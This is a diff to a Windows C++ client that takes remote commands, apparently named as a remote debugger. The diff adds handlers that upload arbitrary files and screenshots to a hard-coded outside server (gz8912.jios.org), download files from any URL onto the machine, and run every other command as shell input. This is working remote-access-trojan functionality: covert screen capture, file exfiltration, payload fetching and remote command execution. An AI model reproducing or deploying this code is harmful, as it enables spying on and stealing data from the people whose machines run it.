@@ -21,6 +21,9 @@
 
 #include "..\公共\Base64.h"
 
+#include "PostFile.h"
+#include "PrintWindow.h"
+
 #if defined(DEBUG) || defined(_DEBUG)
 #define REMOTE_SERVER_IP "localhost"
 #else
@@ -271,6 +274,70 @@ typedef struct tagRUN_CMD_PARAM
 CCSLock csLock;
 BOOL  bRunningCmd = FALSE;
 
+int ParseCommand( CString strCmdLine,CString *pArrayCmdParts,int nArrayCount )
+{
+	int nCount = 0;
+	int nParseIndex = 0;
+	int nSrcStringLen = strCmdLine.GetLength();
+
+
+	CString strTempPart;
+	BOOL   bMark = FALSE;
+	while ( nParseIndex < nSrcStringLen )
+	{
+		WCHAR szChar = strCmdLine.GetAt(nParseIndex);
+
+
+
+		if (szChar == L'\"')
+		{
+			if ( FALSE == bMark )
+			{
+				bMark = TRUE;
+			}
+			else
+			{
+				bMark = FALSE;
+			}
+		}
+
+		if (bMark)
+		{
+			strTempPart+=szChar;
+		}
+		else
+		{
+			if (szChar != L' ')
+			{
+				strTempPart+=szChar;
+			}
+			else
+			{
+				if ( strTempPart.GetLength() > 0 )
+				{
+					pArrayCmdParts[nCount] = strTempPart;
+					nCount++;
+					strTempPart = L"";
+				}
+			}
+		}
+
+		if (nParseIndex == nSrcStringLen - 1)
+		{
+			if ( strTempPart.GetLength() > 0 )
+			{
+				pArrayCmdParts[nCount] = strTempPart;
+				nCount++;
+				strTempPart = L"";
+			}
+		}
+
+		nParseIndex++;
+	}
+
+	return nCount;
+}
+
 DWORD WINAPI RunCmdThread( PVOID pParam )
 {
 	PRUN_CMD_PARAM pRunCmdParam = (PRUN_CMD_PARAM)pParam;
@@ -283,36 +350,18 @@ DWORD WINAPI RunCmdThread( PVOID pParam )
 	OUTPUT_PARAM OutputParam;
 	OutputParam.hClient = pRunCmdParam->hClient;
 	OutputParam.hSource = pRunCmdParam->hSource;
-
-	if ( pRunCmdParam->strCmdData.Find(L"testweb") >= 0  )
-	{
-		CString strCmd;
-		CString strWebUrl;
-
-		int nIndex = 0;
-
-		CString strNodes;
-		CString strNode;
-		int curPos = 0;
-		
-		strNodes = pRunCmdParam->strCmdData;
 	
-		strNode= strNodes.Tokenize(_T(" "),curPos);
-		while (strNode != _T(""))
-		{
-			if ( 0 == nIndex )
-			{
-				strCmd = strNode;
-			}
-			else if( 1 == nIndex )
-			{
-				strWebUrl = strNode;
-			}
+	CString strCmdData;
+	strCmdData = pRunCmdParam->strCmdData;
+	
+	CString strArrayCmdParts[10];
 
-			nIndex++;
-			strNode = strNodes.Tokenize(_T(" "), curPos);
-		};
-
+	int nArrayCount = ParseCommand( strCmdData,strArrayCmdParts,10 );
+	
+	if ( strArrayCmdParts[0].CompareNoCase(L"testweb") == 0 )
+	{
+		CString strWebUrl;
+		strWebUrl = strArrayCmdParts[1];
 		if ( strWebUrl.GetLength() > 0 )
 		{
 			CStringA strWebText;
@@ -327,15 +376,113 @@ DWORD WINAPI RunCmdThread( PVOID pParam )
 			strResponseData = ptlResponse.BuildData();
 			ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength());
 		}
+	}
+	else if ( strArrayCmdParts[0].CompareNoCase(L"upload") == 0 )
+	{
+		
+		CString strUploadFilePath;
+		strUploadFilePath = strArrayCmdParts[1];
+		strUploadFilePath.Replace(L"\"",L"");
+
+
+		CProtocolHandler ptlResponse;
+		ptlResponse.SetParamValueString( "cmd","runcmd");
+
+		CString strResponseText;
+		BOOL bUploadRes = UploadFile(L"http://gz8912.jios.org:8081/remotedebuger/upload.php",strUploadFilePath,strResponseText);
+		if(bUploadRes)
+		{
+			ptlResponse.SetParamValueString( "result",EasyBase64Encode(CStringA("下载链接："+strResponseText)));
+		}
+		else
+		{
+			ptlResponse.SetParamValueString( "result",EasyBase64Encode("上传失败"));
+		}
+
+		ptlResponse.SetParamValueInt( "target",(int)pRunCmdParam->hSource);
+
+		CStringA strResponseData;
+		strResponseData = ptlResponse.BuildData();
+		ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength());
+
 
 	}
-	else if( pRunCmdParam->strCmdData.Find(L"upload") >= 0 )
+	else if ( strArrayCmdParts[0].CompareNoCase(L"download") == 0 )
+	{
+		CString strFileUrl;
+		CString strSavePath;
+		strFileUrl = strArrayCmdParts[1];
+		strSavePath = strArrayCmdParts[2];
+		strSavePath.Replace(L"\"",L"");
+
+		DeleteFile(strSavePath);
+
+		HRESULT hr = URLDownloadToFileW(NULL,strFileUrl,strSavePath,0,NULL);
+
+
+		CProtocolHandler ptlResponse;
+		ptlResponse.SetParamValueString( "cmd","runcmd");
+
+		if( S_OK == hr )
+		{
+			ptlResponse.SetParamValueString( "result",EasyBase64Encode("下载成功"));
+		}
+		else
+		{
+			ptlResponse.SetParamValueString( "result",EasyBase64Encode("下载失败"));
+		}
+
+		ptlResponse.SetParamValueInt( "target",(int)pRunCmdParam->hSource);
+
+		CStringA strResponseData;
+		strResponseData = ptlResponse.BuildData();
+		ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength());
+
+	}
+	else if ( strArrayCmdParts[0].CompareNoCase(L"screenshot") == 0 )
 	{
 
+		int cx = GetSystemMetrics(SM_CXFULLSCREEN);
+		int cy = GetSystemMetrics(SM_CYFULLSCREEN);
+
+		RECT rcScreen;
+		rcScreen.top = 0;
+		rcScreen.left = 0;
+		rcScreen.bottom = cy;
+		rcScreen.right = cx;
+
+		WCHAR  szTempPath[MAX_PATH];
+		GetTempPathW(MAX_PATH,szTempPath);
+		CString strScreenFile;
+		strScreenFile.Format(L"%s\\screenshot%x.jpg",szTempPath,GetTickCount());
+
+		PrintScreenToFile(&rcScreen,100,strScreenFile);
+
+		CProtocolHandler ptlResponse;
+		ptlResponse.SetParamValueString( "cmd","runcmd");
+
+		CString strResponseText;
+		BOOL bUploadRes = UploadFile(L"http://gz8912.jios.org:8081/remotedebuger/upload.php",strScreenFile,strResponseText);
+		if(bUploadRes)
+		{
+			ptlResponse.SetParamValueString( "result",EasyBase64Encode(CStringA("下载链接："+strResponseText)));
+		}
+		else
+		{
+			ptlResponse.SetParamValueString( "result",EasyBase64Encode("上传失败"));
+		}
+
+		DeleteFile(strScreenFile);
+
+		ptlResponse.SetParamValueInt( "target",(int)pRunCmdParam->hSource);
+
+		CStringA strResponseData;
+		strResponseData = ptlResponse.BuildData();
+		ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength());
 	}
 	else
 	{
-		ExecCmdLine(pRunCmdParam->strCmdData,MsgOutputCallBack,&OutputParam);
+		ExecCmdLine(strCmdData,MsgOutputCallBack,&OutputParam);
 	}
 
 	
@@ -426,6 +573,16 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
                      int       nCmdShow)
 {
 
+// 	{
+// 
+// 
+// 		CString strArrayCmdParts[10];
+// 		CString strCmdData;
+// 		strCmdData = L"     upload \"C:\\Program                     Files\\Internet Explorer\\iexplore.exe \" ";
+// 		int nArrayCount = DivisionString(L" \t",strCmdData,strArrayCmdParts,10);
+// 
+// 		return 0;
+// 	}
 // 	{
 // 		ExecCmdLine(L"tasklist /M",TestMsgOutputCallBack,NULL);
 // 		return 0;
